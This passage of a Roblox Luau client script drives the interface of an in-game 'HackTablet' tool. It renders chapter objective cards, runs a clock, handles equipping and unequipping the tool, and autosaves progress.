			TextColor3 = getObjectiveStatusColor(chapter.status),
			Position = UDim2.new(0.6, 0, 0, 8),
			Size = UDim2.new(0.24, -10, 0, 28),
			TextXAlignment = Enum.TextXAlignment.Right,
		})

		local statusIcon = mk("ImageLabel", {
			Parent = header,
			BackgroundTransparency = 1,
			Image = chapter.status == "Locked" and "rbxassetid://18209587336" or "rbxassetid://18209574864",
			Size = UDim2.new(0, 24, 0, 24),
			Position = UDim2.new(0.86, 0, 0.5, -12),
		})

		local arrowLabel = mk("TextLabel", {
			Parent = header,
			BackgroundTransparency = 1,
			Text = chapterExpanded[chapter.id] and "v" or ">",
			Font = Enum.Font.GothamBold,
			TextSize = 18,
			TextColor3 = Color3.fromRGB(180, 180, 180),
			Position = UDim2.new(0.94, 0, 0, 8),
			Size = UDim2.new(0.06, -10, 0, 28),
			TextXAlignment = Enum.TextXAlignment.Right,
		})

		local stepContainer
		if chapterExpanded[chapter.id] and type(chapter.steps) == "table" and #chapter.steps > 0 then
			stepContainer = mk("Frame", {
				Parent = card,
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
			})

			mk("UIListLayout", {
				Parent = stepContainer,
				Padding = UDim.new(0, 6),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			for _, step in ipairs(chapter.steps) do
				local stepRow = mk("Frame", {
					Parent = stepContainer,
					BackgroundColor3 = Color3.fromRGB(15, 19, 28),
					Size = UDim2.new(1, -20, 0, 36),
					Position = UDim2.new(0, 10, 0, 0),
				})
				round(stepRow, 8)

				local stepTextColor = Color3.new(1, 1, 1)
				if step.status == "Completed" then
					stepTextColor = Color3.fromRGB(160, 160, 160)
				end
				local stepLabel = mk("TextLabel", {
					Parent = stepRow,
					BackgroundTransparency = 1,
					Text = step.text,
					Font = Enum.Font.Gotham,
					TextSize = 14,
					TextColor3 = stepTextColor,
					Position = UDim2.new(0, 10, 0, 6),
					Size = UDim2.new(0.7, -20, 1, -12),
					TextXAlignment = Enum.TextXAlignment.Left,
				})
				if step.status == "Completed" then
					mk("Frame", {
						Parent = stepLabel,
						BackgroundColor3 = Color3.fromRGB(160, 160, 160),
						BorderSizePixel = 0,
						Size = UDim2.new(1, 0, 0, 2),
						Position = UDim2.new(0, 0, 0.5, -1),
					})
				end

				mk("TextLabel", {
					Parent = stepRow,
					BackgroundTransparency = 1,
					Text = string.upper(getObjectiveStatusText(step.status)),
					Font = Enum.Font.GothamBold,
					TextSize = 13,
					TextColor3 = getObjectiveStatusColor(step.status),
					Position = UDim2.new(0.7, 0, 0, 6),
					Size = UDim2.new(0.3, -10, 1, -12),
					TextXAlignment = Enum.TextXAlignment.Right,
				})
			end
		end

		header.MouseButton1Click:Connect(function()
			if chapter.status == "Locked" then
				return
			end
			chapterExpanded[chapter.id] = not chapterExpanded[chapter.id]
			renderObjectiveCards(objectivesList)
		end)
	end

	task.defer(function()
		local layout = ObjectivesList:FindFirstChild("UIListLayout")
		if layout then
			ObjectivesList.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end
	end)
end

do
browserState._clockLoopStarted = false
browserState._objectiveUpdatesBound = false

browserState._updateClockLabel = function()
	if ClockLabel and ClockLabel.Parent then
		ClockLabel.Text = os.date("%H:%M:%S")
	end
end

browserState._refreshMissionPanels = function()
	renderMissionCards(ObjectiveManager.Get())
	renderObjectiveCards(ObjectiveManager.Get("ChapterObjectives"))
end

browserState._bindObjectiveUpdates = function()
	if browserState._objectiveUpdatesBound then
		return
	end

	browserState._objectiveUpdatesBound = true
	ObjectiveManager.Changed:Connect(function(objectivesList, category)
		if category == "ChapterObjectives" then
			renderObjectiveCards(objectivesList)
			return
		end

		if category == nil or category == "" then
			renderMissionCards(objectivesList)
		end
	end)
end

browserState._ensureClockLoop = function()
	browserState._updateClockLabel()
	if browserState._clockLoopStarted then
		return
	end

	browserState._clockLoopStarted = true
	task.spawn(function()
		while true do
			task.wait(1)
			if not ClockLabel or not ClockLabel.Parent then
				browserState._clockLoopStarted = false
				break
			end
			browserState._updateClockLabel()
		end
	end)
end

browserState._onEquipped = function()
	if not isToolEquipped() then
		setEquipped(false)
		lastEquipped = false
		return
	end
	setEquipped(true)
	lastEquipped = true
	browserState._markInteraction()
	if HintGUI and HintGUI.Parent ~= PlayerGui then
		HintGUI = nil
	end
	if MainGUI and MainGUI.Parent ~= PlayerGui then
		MainGUI = nil
	end
	local existingHint = PlayerGui:FindFirstChild("TabletHint")
	if existingHint and existingHint ~= HintGUI then
		existingHint:Destroy()
	end
	local existingMain = PlayerGui:FindFirstChild("TabletGUI")
	if existingMain and existingMain ~= MainGUI then
		existingMain:Destroy()
	end
	if ReplayPromptGUI then
		ReplayPromptGUI.Enabled = false
	end
	if not HintGUI then
		HintGUI = buildHint()
	end
	if not MainGUI then
		MainGUI = buildMainUI()
	end
	browserState._bindObjectiveUpdates()
	browserState._ensureClockLoop()
	browserState._refreshMissionPanels()
	if not started then
		HintGUI.Enabled = true
		MainGUI.Enabled = false
	else
		HintGUI.Enabled = false
		MainGUI.Enabled = true
		playAudio()
		if browserState._ensureChapter3MailVisible then
			browserState._ensureChapter3MailVisible()
		end
	end
	bindEGuard()
end

browserState._onUnequipped = function()
	if not isEquipped and not HintGUI and not MainGUI and not ReplayPromptGUI then
		lastEquipped = false
		return
	end
	setEquipped(false)
	lastEquipped = false
	started = false
	if ReplayPromptGUI then
		ReplayPromptGUI.Enabled = false
		ReplayPromptGUI:Destroy()
		ReplayPromptGUI = nil
	end
	if HintGUI then 
		HintGUI.Enabled = false
		HintGUI:Destroy()
		HintGUI = nil
	end
	if MainGUI then 
		MainGUI.Enabled = false
		MainGUI:Destroy()
		MainGUI = nil
	end
	stopAudio()
	teardownStart()
	bindEGuard()
	task.defer(function()
		saveNow({ silent = true, force = true })
	end)
end

browserState._hookTool = function(t)
	if Tool == t then return end
	Tool = t
	t.AncestryChanged:Connect(function(_, parent)
		if not parent and Tool == t then
			browserState._onUnequipped()
			Tool = nil
		end
	end)
	t:GetPropertyChangedSignal("Parent"):Connect(function()
		if Tool ~= t then
			return
		end
		local char = Player.Character
		if char and t.Parent == char then
			browserState._onEquipped()
		elseif isEquipped or HintGUI or MainGUI or ReplayPromptGUI then
			browserState._onUnequipped()
		end
	end)
	t.Equipped:Connect(browserState._onEquipped)
	t.Unequipped:Connect(browserState._onUnequipped)
	local char = Player.Character
	if char and t.Parent == char then
		browserState._onEquipped()
	end
end

browserState._findTool = function()
	local char = Player.Character
	local backpack = Player:FindFirstChildOfClass("Backpack")
	if char then
		local t = char:FindFirstChild(TOOL_NAME)
		if t and t:IsA("Tool") then return t end
	end
	if backpack then
		local t = backpack:FindFirstChild(TOOL_NAME)
		if t and t:IsA("Tool") then return t end
	end
	return nil
end

browserState._watchContainer = function(container)
	if not container then
		return
	end
	container.ChildAdded:Connect(function(child)
		if child:IsA("Tool") and child.Name == TOOL_NAME then
			browserState._hookTool(child)
		end
	end)
	local toolInContainer = container:FindFirstChild(TOOL_NAME)
	if toolInContainer and toolInContainer:IsA("Tool") then
		browserState._hookTool(toolInContainer)
	end
end

browserState._watchContainer(Player:WaitForChild("Backpack"))
browserState._watchContainer(Player.Character or Player.CharacterAdded:Wait())
Tool = Tool or browserState._findTool()
if Tool then
	browserState._hookTool(Tool)
end
lastEquipped = isToolEquipped()
Player.CharacterAdded:Connect(function(char)
	started = false
	stopAudio()
	teardownStart()
	bindEGuard()
	browserState._watchContainer(char)
	task.defer(function()
		Tool = nil
		lastEquipped = false
		task.wait(0.1)
		Tool = browserState._findTool()
		if Tool then
			browserState._hookTool(Tool)
			if isToolEquipped() then
				browserState._onEquipped()
			end
		end
	end)
end)
RunService.Heartbeat:Connect(function()
	local now = os.clock()
	if not Tool then
		Tool = browserState._findTool() or Tool
		if Tool then
			browserState._hookTool(Tool)
		end
		return
	end
	if browserState._ensureChapter3MailVisible then
		browserState._ensureChapter3MailVisible()
	end
	if browserState.adminTab == "logs" and BrowserFrame and BrowserFrame.Visible and AdminDashboardPage and AdminDashboardPage.Visible then
		if now - (browserState.logsLastRender or 0) >= 1 then
			browserState.logsLastRender = now
			renderAdminLogs()
		end
	end
	if autoSaveQueuedAt > 0 and not autoSaveInFlight and now - autoSaveQueuedAt >= AUTO_SAVE_DELAY then
		saveNow({ silent = true })
	elseif MainGUI and MainGUI.Enabled and not autoSaveInFlight then
		if now - (browserState.lastInteractionAt or 0) >= 30 and not browserState.idleAutoSaveNotified then
			if saveNow({ silent = true, force = true }) then
				browserState.idleAutoSaveNotified = true
				notify({ Title = "HackTablet", Text = "Autosaved after 30 seconds of inactivity.", Duration = 3 })
			end
		elseif now - autoSaveLastRunAt >= AUTO_SAVE_INTERVAL then
			queueAutoSave(false)
		end
	end
	local equippedNow = isToolEquipped()
	if equippedNow ~= lastEquipped then
		lastEquipped = equippedNow
		if equippedNow then
			browserState._onEquipped()
		else
			browserState._onUnequipped()
		end
	end
end)
end

if MainGUI then
MainGUI:GetPropertyChangedSignal("Enabled"):Connect(bindEGuard)
end
Player:GetAttributeChangedSignal(RESTORE_STATE_ATTRIBUTE):Connect(function()
applyPendingRestoreState()
end)
task.defer(function()
applyPendingRestoreState()
end)
